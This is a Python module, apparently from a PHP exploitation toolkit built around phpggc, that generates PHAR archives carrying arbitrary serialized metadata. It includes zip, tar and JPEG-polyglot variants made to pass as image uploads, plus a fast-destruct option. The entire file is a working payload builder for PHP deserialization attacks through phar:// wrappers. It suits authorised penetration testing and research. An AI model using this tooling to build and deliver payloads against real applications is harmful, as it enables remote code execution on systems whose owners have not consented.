"""PHAR generation (SHA1 phar in pure Python; zip/tar via optional PHP bridge)."""
from __future__ import annotations

import hashlib
import shutil
import struct
import subprocess
import zlib
from pathlib import Path

from .platform import GenerateOptions


def build_phar(
    metadata: bytes,
    *,
    timestamp: int = 1,
    stub: bytes = b"<?php __HALT_COMPILER(); ?>\r\n",
    inner_name: str = "test.txt",
    inner_content: bytes = b"test",
) -> bytes:
    def u32(n: int) -> bytes:
        return struct.pack("<I", n)

    name_b = inner_name.encode()
    crc = zlib.crc32(inner_content) & 0xFFFFFFFF

    manifest = b""
    manifest += u32(1)
    manifest += struct.pack(">H", 0x1100)
    manifest += u32(0x10000)
    manifest += u32(0)
    manifest += u32(len(metadata)) + metadata
    manifest += u32(len(name_b)) + name_b
    manifest += u32(len(inner_content))
    manifest += u32(timestamp)
    manifest += u32(len(inner_content))
    manifest += u32(crc)
    manifest += u32(0x1A4)
    manifest += u32(0)

    body = u32(len(manifest)) + manifest + inner_content
    blob = stub + body
    sig = hashlib.sha1(blob).digest()
    return blob + sig + u32(0x0002) + b"GBMB"


def build_phar_from_options(metadata: bytes, opts: GenerateOptions) -> bytes:
    fmt = opts.phar or "phar"
    if fmt == "phar":
        stub = opts.phar_prefix + b"<?php __HALT_COMPILER(); ?>\r\n"
        return build_phar(
            metadata,
            timestamp=opts.phar_timestamp,
            stub=stub,
            inner_name=opts.phar_filename,
        )
    return build_phar_via_php(metadata, fmt, opts)


def build_phar_via_php(metadata: bytes, fmt: str, opts: GenerateOptions) -> bytes:
    """Build zip/tar/jpeg phar using local php + phpggc when available."""
    php = shutil.which("php")
    phpggc = _locate_phpggc()
    if not php or not phpggc:
        raise RuntimeError(
            f"phar format {fmt!r} requires local php CLI and phpggc "
            "(zip/tar/jpeg polyglot uses PHP Phar extension)"
        )
    script_dir = str(Path(phpggc).parent)
    cmd = [
        php, "-d", "display_errors=0", "-d", "phar.readonly=0",
        phpggc, "--phar", fmt,
    ]
    if opts.fast_destruct:
        cmd.append("-f")
    if opts.phar_prefix:
        prefix_path = Path(script_dir) / ".lvc_phar_prefix.bin"
        prefix_path.write_bytes(opts.phar_prefix)
        cmd.extend(["--phar-prefix", str(prefix_path)])
    if opts.phar_filename != "test.txt":
        cmd.extend(["--phar-filename", opts.phar_filename])
    if opts.phar_jpeg is not None:
        jpeg_path = Path(script_dir) / ".lvc_phar_jpeg.bin"
        jpeg_path.write_bytes(opts.phar_jpeg)
        cmd.extend(["--phar-jpeg", str(jpeg_path)])
    cmd.extend(["--", metadata.decode("latin-1")])
    # phpggc expects chain args — for raw metadata use stdin trick via temp file
    # Fallback: write metadata to temp and use php -r with Phar API
    return _build_phar_php_inline(php, metadata, fmt, opts)


def _build_phar_php_inline(php: str, metadata: bytes, fmt: str, opts: GenerateOptions) -> bytes:
    import base64
    import tempfile

    meta_b64 = base64.b64encode(metadata).decode("ascii")
    prefix_b64 = base64.b64encode(opts.phar_prefix).decode("ascii")
    jpeg_b64 = base64.b64encode(opts.phar_jpeg or b"").decode("ascii")
    php_script = f"""<?php
$metadata = base64_decode('{meta_b64}');
$prefix = base64_decode('{prefix_b64}');
$filename = {repr(opts.phar_filename)};
$format = {repr(fmt)};
$jpeg = base64_decode('{jpeg_b64}');
$path = sys_get_temp_dir() . '/lvc_' . $format . '.phar';
@unlink($path);
$phar = new Phar($path);
$phar->startBuffering();
$phar->addFromString($filename, 'test');
$phar->setStub($prefix . '<?php __HALT_COMPILER(); ?>');
$dummy = str_repeat('A', max(0, strlen($metadata) - strlen(serialize(""))));
$phar->setMetadata($dummy);
$phar->setSignatureAlgorithm(Phar::SHA1);
$phar->stopBuffering();
$data = file_get_contents($path);
$data = str_replace(serialize($dummy), $metadata, $data);
if ($format === 'tar' && $jpeg) {{
    $phar = substr($data, 6);
    $len = strlen($phar);
    $contents = substr($jpeg, 0, 2) . "\\xff\\xfe" . chr(($len >> 8) & 0xff) .
        chr($len & 0xff) . $phar . substr($jpeg, 2);
    $contents = substr($contents, 0, 148) . "        " . substr($contents, 156, 344) . "aaaa" . substr($contents, 504);
    $chksum = 0;
    for ($i = 0; $i < 512; $i++) $chksum += ord(substr($contents, $i, 1));
    $oct = sprintf("%06o", $chksum) . "x";
    $data = substr($contents, 0, 148) . $oct . substr($contents, 155);
}}
unlink($path);
echo $data;
"""
    with tempfile.NamedTemporaryFile(suffix=".php", mode="w", delete=False) as f:
        f.write(php_script)
        script_path = f.name
    try:
        out = subprocess.run(
            [php, "-d", "display_errors=0", "-d", "phar.readonly=0", script_path],
            capture_output=True,
            check=False,
        )
    finally:
        Path(script_path).unlink(missing_ok=True)
    if out.returncode != 0 or not out.stdout:
        err = out.stderr.decode(errors="replace")[:300]
        raise RuntimeError(f"PHP phar build failed: {err or 'no output'}")
    return out.stdout


def _locate_phpggc() -> str | None:
    for name in ("phpggc",):
        found = shutil.which(name)
        if found:
            return found
    return None
